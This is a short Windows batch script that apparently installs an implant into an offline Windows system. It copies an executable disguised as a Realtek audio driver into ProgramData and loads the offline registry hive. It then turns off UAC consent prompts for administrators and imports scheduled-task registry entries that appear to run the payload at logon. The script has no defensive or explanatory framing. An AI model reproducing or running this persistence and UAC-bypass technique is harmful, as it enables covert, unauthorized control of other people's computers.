@echo off
setlocal enabledelayedexpansion

for %%i in (C D E F G H I J K L M N O P Q R S T U V W) do (
    if exist %%i:\Windows\explorer.exe (
        set "WINLETTER=%%i:"
        goto :found
    )
)

:found
echo Windows !WINLETTER!


mkdir "!WINLETTER!\ProgramData\Realtek"
mkdir "!WINLETTER!\ProgramData\Realtek\Audio"
copy rtkAudioDRVx64.exe "!WINLETTER!\ProgramData\Realtek\Audio\"


reg load HKLM\zSOFTWARE "!WINLETTER!\Windows\System32\Config\SOFTWARE"
reg add "HKLM\zSOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
reg import TaskTasks.reg
reg import TaskTree.reg
reg import TaskLogon.reg
reg unload HKLM\zSOFTWARE